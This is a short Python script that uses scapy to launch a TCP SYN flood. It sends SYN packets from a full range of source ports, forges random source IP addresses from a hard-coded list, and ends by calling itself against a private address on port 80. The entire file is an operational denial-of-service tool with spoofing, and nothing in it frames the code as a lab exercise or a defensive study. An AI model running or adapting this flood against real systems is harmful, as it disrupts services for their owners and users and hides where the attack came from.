import random
from scapy.all import *

def synFlood(tgt,dPort):
    srcList = ['201.1.1.2','1.1.1.1','2.2.2.2','3.3.3.3']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index],dst=tgt)
        tcpLayer = TCP(sport=sPort,dport=dPort,flags="S")
        packet = ipLayer/tcpLayer
        send(packet)

synFlood('172.16.31.207','80')
